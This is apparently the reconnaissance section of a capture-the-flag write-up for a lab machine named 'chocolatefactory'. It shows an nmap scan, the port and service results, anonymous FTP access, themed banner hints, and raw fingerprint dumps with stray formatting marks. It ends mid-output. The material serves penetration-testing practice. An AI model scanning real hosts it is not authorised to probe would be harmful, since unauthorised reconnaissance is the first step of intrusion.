# chocolatefactory

\#============================================================================# Reconnaissance #============================================================================

\#>>>>>>>> Port Scanning

> nmap 10.10.229.79

PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 100/tcp open newacct 106/tcp open pop3pw 109/tcp open pop2 110/tcp open pop3 111/tcp open rpcbind 113/tcp open ident 119/tcp open nntp 125/tcp open locus-map

\#.......Aggressive Scanning

21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum\_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.17.5.163 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA) | 256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA) | 256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519) 100/tcp open newacct? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | **.---------------. | .'**'**'**'**'**, `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.\_\_| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |_**;\_\_\_\_\_\_\_\_\_\_\_\_\_**_**| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |**_** hope you wont drown Augustus" 106/tcp open pop3pw? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | \_.---------------. | .''''', `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |**_**;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) | hope you wont drown Augustus" 109/tcp open pop2? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | \_.---------------. | .''**'**'**'**, `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.**| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |**;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |**_** hope you wont drown Augustus" 110/tcp open pop3? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | \_.---------------. | .''''', `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |**_**;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) | hope you wont drown Augustus" 111/tcp open rpcbind? | fingerprint-strings: | NULL, RPCCheck: | "Welcome to chocolate room!! | \_.---------------. | .''**'**'**'**, `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.**| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |**;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) | hope you wont drown Augustus" 113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LDAPSearchReq, LPDString, NULL, RTSPRequest, SMBProgNeg, TLSSessionReq, TerminalServer, X11Probe, afp: | http://localhost/key\_rev\_key <- You will find the key here!!! 119/tcp open nntp? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | \_.---------------. | .''''', `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.\_\_| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |**_** hope you wont drown Augustus" 125/tcp open locus-map? | fingerprint-strings: | GenericLines, NULL: | "Welcome to chocolate room!! | \_.---------------. | .''''', `. ____ ___ \r | _:\x20 |:. \x20 ___ \r | \'__'__'__'__'_`.| `. \x20 ___ \r | \'__'__'__\x20__'_;-----------------` | |**_**;\_\_\_\_\_\_\_\_\_\_\_\_\_\_| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) | hope you wont drown Augustus" 8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port100-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20**_.---------------.\r\
SF:x20\x20.'\\**\\'\\**\\'\\**\\'\\**\\'\\**,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.**|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|\_\_\_\_\_\_\_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:;|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port106-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20.---------------.\r**_\
_**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:;|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port109-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20.---------------.\r**_\
_**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:;|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port110-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20.---------------.\r**_\
_**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:;|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port111-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20.---------------.\r**_\
_**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(RPC SF:Check,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20**_**.---------------.**\
**SF:n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20___ SF:_\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x SF:20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\ SF:__\\'\\__\\'\\__\\'\\__\\'\\_`.|\x20\x20`\.\x20\\\x20\x20\\___\x20\ SF:\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x2 SF:0\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------- SF:---`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20 SF:\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|\_ SF:**_**;|\r\n\r\nA\x20small\x20hint\x20from**_\
_**SF:x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!**_\
_**SF:x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port113-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,3E,"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20th SF:e\x20key\x20here!!!\n")%r(GenericLines,3E,"http://localhost/key\_rev\_key SF:\x20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(GetRequest SF:,3E,"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x SF:20key\x20here!!!\n")%r(Help,3E,"http://localhost/key\_rev\_key\x20<-\x20Y SF:ou\x20will\x20find\x20the\x20key\x20here!!!\n")%r(HTTPOptions,3E,"http: SF://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x20key\x20h SF:ere!!!\n")%r(RTSPRequest,3E,"http://localhost/key\_rev\_key\x20<-\x20You**_\
_**SF:x20will\x20find\x20the\x20key\x20here!!!\n")%r(DNSVersionBindReqTCP,3E, SF:"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x20ke SF:y\x20here!!!\n")%r(DNSStatusRequestTCP,3E,"http://localhost/key\_rev\_key SF:\x20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(TLSSession SF:Req,3E,"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20th SF:e\x20key\x20here!!!\n")%r(SMBProgNeg,3E,"http://localhost/key\_rev\_key\x SF:20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(X11Probe,3E, SF:"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x20ke SF:y\x20here!!!\n")%r(LPDString,3E,"http://localhost/key\_rev\_key\x20<-\x20 SF:You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(LDAPSearchReq,3E,"ht SF:tp://localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x20key\x SF:20here!!!\n")%r(TerminalServer,3E,"http://localhost/key\_rev\_key\x20<-\x SF:20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(JavaRMI,3E,"http:/ SF:/localhost/key\_rev\_key\x20<-\x20You\x20will\x20find\x20the\x20key\x20he SF:re!!!\n")%r(afp,3E,"http://localhost/key\_rev\_key\x20<-\x20You\x20will\x SF:20find\x20the\x20key\x20here!!!\n"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port119-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20**_**.---------------.\r**\
**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**\_\_\_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:;|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port125-TCP:V=7.94SVN%I=7%D=6/9%Time=666579BC%P=x86\_64-pc-linux-gnu%r(N SF:ULL,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20.---------------.\r**_\
_**SF:x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x20____\ SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20 SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__ SF:\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\ SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\ SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------------- SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\|**_ SF:_**;|\r\n\r\nA\x20small\x20hint\x20from\x2 SF:0Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2 SF:0;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20")%r(Gen SF:ericLines,20F,""Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20.---------------**_\
